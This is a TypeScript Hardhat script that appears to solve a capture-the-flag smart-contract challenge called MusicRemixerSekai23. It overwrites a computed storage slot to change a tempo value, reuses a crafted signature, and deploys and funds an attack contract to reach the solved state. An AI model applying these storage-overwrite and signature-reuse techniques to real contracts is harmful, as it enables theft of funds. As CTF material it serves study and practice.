import chalk from "chalk";
import { ethers } from "hardhat";
import { MusicRemixerSekai23__factory, MusicRemixerSekai23, SampleEditorSekai23__factory, MusicRemixerSekai23Attack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [musicRemixerContract, attacker] = await initialize<MusicRemixerSekai23>(MusicRemixerSekai23__factory, undefined, undefined, "100");
    let editor = SampleEditorSekai23__factory.connect(await musicRemixerContract.sampleEditor(), attacker);
    let tx;
    
    // change tempo
    tx = await editor.setTempo(233);
    await tx.wait();
    let region = ethers.solidityPackedKeccak256(["string", "uint256"], ["Rhythmic", 2]);
    let regionStart = ethers.keccak256(region);
    // console.log(await ethers.provider.getStorage(editor, BigInt(regionStart) + BigInt(4)));
    let v = ethers.zeroPadValue("0x0101", 32);
    // console.log(v);
    tx = await editor.updateSettings(BigInt(regionStart) + BigInt(4), v);
    await tx.wait();
    tx = await editor.adjust();
    await tx.wait();
    log(`Tempo: ${await editor.region_tempo()}`);

    // get initial fund
    let signature = ethers.Signature.from("0x1337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE13371337C0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DEC0DE133728");
    // tx = await musicRemixerContract.getMaterial(signature.compactSerialized);
    // await tx.wait();

    let attackContract = await new MusicRemixerSekai23Attack__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    tx = await attackContract.setUp(await musicRemixerContract.getAddress(), signature.compactSerialized, {value:ethers.parseEther("1")});
    await tx.wait();
    tx = await attackContract.attack();
    await tx.wait();

    log(`Is Solved: ${chalk.yellow(await musicRemixerContract.isSolved())}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
})